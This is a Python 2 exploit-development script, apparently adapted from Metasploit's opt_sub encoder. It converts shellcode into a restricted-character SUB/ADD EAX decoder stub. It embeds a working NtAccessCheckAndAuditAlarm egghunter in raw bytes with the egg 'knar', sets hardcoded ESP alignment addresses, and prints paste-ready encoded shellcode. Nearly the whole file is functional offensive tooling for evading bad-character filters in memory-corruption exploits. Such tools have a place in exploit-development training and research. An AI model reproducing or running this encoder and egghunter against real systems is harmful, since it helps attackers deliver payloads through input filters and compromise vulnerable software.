#!/usr/bin/env python
# Code for find_terms function adapted from https://vulners.com/metasploit/MSF:ENCODER/X86/OPT_SUB

# sc variable should contain the target decoded shellcode
# esp_current variable should contain the value of ESP at the first instruction of the generated decoder shellcode
# esp_target variable should contain the address where the target shellcode will be decoded
# esp_target should be separated from the decoder shellcode by a sled of inoffensive instructions
# if esp_current and esp_target are not provided, ESP must already point to the address where the shellcode will be decoded
# goodchar should be a string containing valid characters to be used by the decoder
# It requires minimum 16 bytes per 4 bytes of shellcode to be decoded + 19 bytes for ESP alignment
# If EAX needs to be zeroized, this will generate an additional 12 bytes the 1st time and 2 bytes for each subsequent need

# Original shellcode
egg = "knar"
sc_desc = "# NtAccessCheckAndAuditAlarm Shellcode Egghunter\n# Egg: %s" %egg
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" + egg + "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
subesp = "\x81\xEC\x00\x10\x00\x00\x41\x41" # SUB ESP, 0x1000 # May be required if payload crashes (the decoded shellcode might be overwriting itself)
sc = subesp + egghunter


# ESP Alignment values
esp_current = 0x1034E1E8
esp_target  = 0x1035FFF0


# Valid Charset definition
SET_ALPHAU   = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" # 0x41 --> 0x5A
SET_ALPHAL   = "abcdefghijklmnopqrstuvwxyz" # 0x61 --> 0x7A
SET_NUM      = "0123456789"                 # 0x30 --> 0x39
SET_CUST     = ""
SET_SYM      = "!@#$%^&*()_+\\-=[]{};'\":<>,.?/|~"
SET_FILESYM  = '()_+-=\\/.,[]{}@!$%^&='
SET_0        = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
SET_1        = "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
SET_2        = "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e"
SET_3        = "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e"
SET_4        = "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
SET_5        = "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
SET_6        = "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
SET_7        = "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
MAND_OPCODES = "\x25\x50\x52\x54\x58\x5A\x5C"
ADDEAX       = "\x05"
SUBEAX       = "\x2d"

goodchar = MAND_OPCODES + SET_ALPHAL + SET_ALPHAU + SET_NUM + SET_0
goodchar += SUBEAX
goodchar += ADDEAX

MIN_COMPONENTS = 1
MAX_COMPONENTS = 3


# ------------------------------------------------------------
#              NO USER-SERVICEABLE VAR BELOW THIS
# ------------------------------------------------------------

import binascii
import struct
import sys
import time
from itertools import combinations



CRED = "\033[91m"; CGRE = "\033[92m"; CYEL = "\033[93m"; CBLU = "\033[94m"; CPUR = "\033[95m"; CCYA = "\033[96m"; CWHI = "\033[97m"; CRST = "\033[0m"; BRED= "\033[41m"

OC = {
    "ADD_EAX"  : "\x05",    # <ENQ>
    "AND_EAX"  : "\x25",    # %
    "SUB_EAX"  : "\x2d",    # -
    "PUSH_EAX" : "\x50",    # P
    "PUSH_EDX" : "\x52",    # R
    "PUSH_ESP" : "\x54",    # T
    "POP_EAX"  : "\x58",    # X
    "POP_EDX"  : "\x5a",    # Z
    "POP_ESP"  : "\x5c",    # \
}

REQUIRED_OPCODES = [
#    OC["ADD_EAX"],
    OC["AND_EAX"],
    OC["SUB_EAX"],
    OC["PUSH_EAX"],
    OC["PUSH_EDX"],
    OC["PUSH_ESP"],
    OC["POP_EAX"],
    OC["POP_EDX"],
    OC["POP_ESP"],
]

def check_valid_bytes(goodchar):
    valid_bytes = set()
    for c in goodchar:
        valid_bytes.add(ord(c))
    valid_bytes = list(valid_bytes)

    valid_chars = ""
    for i in valid_bytes:
        valid_chars += "0x%02x " %i
        if i in range(0x20, 0x7f):
            valid_chars += "(%s) " % chr(i)

    missing_opcodes = []
    for opcode in REQUIRED_OPCODES:
        if ord(opcode) not in valid_bytes:
            halt = True
            missing_opcodes.append("0x%02x: %s \t(%s)" % (ord(opcode), OC.keys()[OC.values().index(opcode)], ascii_san(opcode)))

    if missing_opcodes :
        print("%sMissing the following opcodes in the valid charset to build shellcode :%s" % (CRED, CRST))
        for opcode in missing_opcodes:
            print(opcode)
        print("\n"*3)
        sys.exit()
    return valid_bytes, valid_chars


def pad(str, int, chr):
    while len(str) % int:
        str += chr
    return str


def stre(s):
    return ''.join('\\x' + binascii.hexlify(c) for c in s)


def split_word(hexstr):
    n = 8
    return [(int(hexstr[i:i+n], 16)) for i in range(0, len(hexstr), n)]


def find_terms(chunk, previous=0):
    nosub = noadd = 1
    if ord(OC["SUB_EAX"]) in valid_bytes : nosub = 0
    if ord(OC["ADD_EAX"]) in valid_bytes : noadd = 0
    assert  noadd + nosub != 2

    if chunk == previous:
        terms = []
        return terms, chunk, None

    target_s = previous - chunk     # SUB
    target_a = chunk - previous     # ADD

    for terms_count in range(MIN_COMPONENTS, MAX_COMPONENTS+1):
        terms_s = [0] * terms_count
        terms_a = [0] * terms_count
        carry_s = carry_a = 0

        for byte_num in range(0, 4):
            b_s =  target_s >> (byte_num * 8) & 0xFF
            b_a =  target_a >> (byte_num * 8) & 0xFF
            ops_found = b_s_found = b_a_found = b_x_found = 0

            for combo in combinations(valid_bytes, len(terms_s)):
                # get the total of the current bytes combo, including the carry from
                # the previous calculation
                total_s = sum(combo) + carry_s
                total_a = sum(combo) + carry_a

                # if we matched a SUB byte..
                if (total_s & 0xFF) == b_s and not b_s_found:
                    # store the carry for the next calculation
                    carry_s = (total_s >> 8) & 0xFF
                    # store the values in their respective locations
                    for i in range(len(terms_s)):
                        terms_s[i] |= combo[i] << (byte_num * 8)
                    b_s_found = 1

                # if we matched a ADD byte..
                if (total_a & 0xFF) == b_a and not b_a_found:
                    carry_a = (total_a >> 8) & 0xFF
                    for i in range(len(terms_a)):
                        terms_a[i] |= combo[i] << (byte_num * 8)
                    b_a_found = 1

                # break if combo found for all available operand
                if (b_s_found or nosub) and (b_a_found or noadd):
                    break

        # if a solution is found
        if previous == sum(terms_s, chunk) % 2**32 and ord(OC["SUB_EAX"]) in valid_bytes:
            opr = OC["SUB_EAX"]
            return terms_s, chunk, opr

        if chunk == sum(terms_a, previous) % 2**32 and ord(OC["ADD_EAX"]) in valid_bytes:
            opr = OC["ADD_EAX"]
            return terms_a, chunk, opr

    # raise exception if no solution found
    assert previous == sum(terms_s, chunk) % 2**32


def find_opposite_bytes(list):
    for b1 in list:
        for b2 in list:
            if b1 & b2 == 0:
                return b1, b2
    return None, None


def ascii_san(s):
    san = ""
    for c in s:
        if ord(c) in range(0x20, 0x7f):
            san += c
        else:
            san += "."
    return san


def zeroize_eax(sc_enc, sc_enc_verb, eaxz):
    eax1, eax2 = find_opposite_bytes(valid_bytes)
    if eaxz == 0:
        sc_enc_verb += "# Zeroizing EAX and saving value into EDX\n"
        sc_enc      += "%s%s%s%s%s" % (chr(0x25), chr(eax1), chr(eax1), chr(eax1), chr(eax1))
        sc_enc      += "%s%s%s%s%s" % (chr(0x25),chr(eax2), chr(eax2), chr(eax2), chr(eax2))
        sc_enc_verb += "\"\\x25\\x%02x\\x%02x\\x%02x\\x%02x\"    # AND EAX 0x%02x%02x%02x%02x\n" % (eax1, eax1, eax1, eax1, eax1, eax1, eax1, eax1)
        sc_enc_verb += "\"\\x25\\x%02x\\x%02x\\x%02x\\x%02x\"    # AND EAX 0x%02x%02x%02x%02x\n" % (eax2, eax2, eax2, eax2, eax2, eax2, eax2, eax2)
        sc_enc      += "\x50"
        sc_enc      += "\x5A"
        sc_enc_verb += "\"\\x50\"                    # PUSH EAX\n"
        sc_enc_verb += "\"\\x5A\"                    # POP EDX\n\n"
        eaxz = 1
    else:
        sc_enc_verb += "# Zeroizing EAX from EDX\n"
        sc_enc      += "\x52"
        sc_enc      += "\x58"
        sc_enc_verb += "\"\\x52\"                    # PUSH 0x%08x (EDX)\n" % 0
        sc_enc_verb += "\"\\x58\"                    # POP EAX\n\n"
    return sc_enc, sc_enc_verb, eaxz


def encodesc(sc, esp_cur=None, esp_tgt=None):
    eaxz = 0
    sc_enc = ""
    sc_enc_verb = "# " + "-"*60
    previous = 0

    # Step 1: Reverse shellcode (setup correct endianness for decoding)
    sc = sc[::-1]

    # Step 2: Pad shellcode to DWORDS
    sc = pad(sc, 4, "\x90")
    sc_hex =  binascii.hexlify(sc)

    # Step 3: Split shellcode into DWORDS
    sc_words = split_word(sc_hex)

    sc_enc_verb += "\n"
    sc_enc_verb += sc_desc
    sc_enc_verb += "\n# length: LENPLACEHOLDER bytes\n\n"
    sc_enc_verb += "shellcode_decoder = (\n"

    # Step 4: Compute ESP alignment shellcode
    if esp_cur and esp_tgt:
        sc_enc_verb += "# Perform ESP offset alignment towards desired target\n"
        sc_enc_verb += "# ESP=0x%08x, Target=0x%08x: " % (esp_cur, esp_tgt)

        try:
            terms, previous, opr = find_terms(esp_tgt, esp_cur)

        except AssertionError :
            sc_enc_verb += " %sNOK%s\n" % (CRED, CRST)
            sc_enc_verb += "# %s/!\ WARNING: Cannot compute target ESP with the available charset %s\n" % (CRED, CRST)
            sc_enc_verb += "# %s/!\ ESP must already point to the address where the shellcode will be decoded /!\ %s\n"% (CRED, CRST)
            sc_enc_verb += "# Memory layout should be EIP (Current shellcode) --> SLED --> ESP\n\n\n"

        else:
            sc_enc_verb += " %sOK%s \n" % (CGRE, CRST)
            # Get EIP into EAX
            sc_enc      += "\x54"
            sc_enc      += "\x58"
            sc_enc_verb += "\"\\x54\"                    # PUSH ESP\n"
            sc_enc_verb += "\"\\x58\"                    # POP EAX\n"

            for term in terms:
                sc_enc      +=             opr + struct.pack('<I', term)
                sc_enc_verb += "\"" + stre(opr + struct.pack('<I', term))
                if opr == "\x2d" :
                    sc_enc_verb += "\"    # SUB EAX, 0x%08x\n" % term
                elif opr == "\x05" :
                    sc_enc_verb += "\"    # ADD EAX, 0x%08x\n" % term
                else:
                    sc_enc_verb += "\"\n"

            sc_enc      += "\x50"
            sc_enc      += "\x5C"
            sc_enc_verb += "\"\\x50\"                    # PUSH 0x%x (EAX)\n" % esp_target
            sc_enc_verb += "\"\\x5C\"                    # POP ESP\n"
            sc_enc_verb += "# Memory layout should be EIP (Current shellcode) --> SLED --> ESP (0x%x)\n\n" %esp_target
    else:
        sc_enc_verb += "# /!\ WARNING: No value provided for EIP current/target /!\ \n"
        sc_enc_verb += "# /!\ ESP must already point to the address where the shellcode will be decoded /!\ \n"
        sc_enc_verb += "# Memory layout should be EIP (Current shellcode) --> SLED --> ESP\n\n"

    # Step 5: Compute the add/sub terms for each chunk; each computation will take the previous target as starting point
    for i in range(len(sc_words)):
        if i != 0: sc_enc_verb += "\n"
        if previous == 0:
            sc_enc, sc_enc_verb, eaxz = zeroize_eax(sc_enc, sc_enc_verb, eaxz)
            sc_enc_verb += "\n"

        # Compute each chunk add/sub components
        sc_enc_verb += "# EAX=0x%08x, Target=0x%08x:" % (previous, sc_words[i])
        try:
            terms, previous, opr = find_terms(sc_words[i], previous)

        # If the computation failed, try again starting with EAX = 0
        except AssertionError as e:
            previous = 0
            sc_enc_verb += " %sNOK%s\n" % (CRED, CRST)
            sc_enc, sc_enc_verb, eaxz = zeroize_eax(sc_enc, sc_enc_verb, eaxz)
            sc_enc_verb += "# EAX=0x%08x, Target=0x%08x:" % (previous, sc_words[i])
            try:
                terms, previous, opr = find_terms(sc_words[i], previous)

            # If it failed again, abort
            except AssertionError as e:
                sc_enc_verb += " %sNOK%s\n" % (CRED, CRST)
                sc_enc_verb += "# %s/!\ No solution found with the available charset %s\n)" % (CRED, CRST)
                print(sc_enc_verb)
                raise Exception("%sno solution with available charset%s" % (CRED, CRST))

            else:
                sc_enc_verb += " %sOK%s \n" % (CGRE, CRST)

        else:
            sc_enc_verb += " %sOK%s \n" % (CGRE, CRST)

        # Produce the decoding instructions
        for term in terms:
            sc_enc      +=             opr + struct.pack('<I', term)
            sc_enc_verb += "\"" + stre(opr + struct.pack('<I', term))
            if opr == "\x2d" :
                sc_enc_verb += "\"    # SUB EAX, 0x%08x\n" % term
            elif opr == "\05" :
                sc_enc_verb += "\"    # ADD EAX, 0x%08x\n" % term
            else:
                sc_enc_verb += "\"\n"

        # Push the decoded shellcode chunk on the stack
        sc_enc      += "\x50"
        sc_enc_verb += "\"\\x50\"                    # PUSH 0x%08x (EAX)\n" % sc_words[i]

    # End the variable
    sc_enc_verb += ")\n# " + "-"*60 + "\n\n"

    # Write shellcode length in the header
    sc_enc_verb = sc_enc_verb.replace("LENPLACEHOLDER",str(len(sc_enc)))

    return sc_enc, sc_enc_verb


start = time.time()
valid_bytes, valid_chars = check_valid_bytes(goodchar)
sc_encoded, sc_encoded_verb = encodesc(sc, esp_current, esp_target)
dur = time.time() - start

print("Valid charset: %s\n\n\n" % valid_chars)
print("" + sc_encoded_verb)
print("Solution computed in %f seconds\n" % dur )
print("Original shellcode length: %i" %len(sc))
print("Encoded  shellcode length: %i" % len(sc_encoded))
print("\noriginal_shellcode = \"%s\"") % stre(sc)
print("\nshellcode_decoder = \"%s\"")  % stre(sc_encoded)
print("\nASCII : \"%s\"") % ascii_san(sc_encoded)
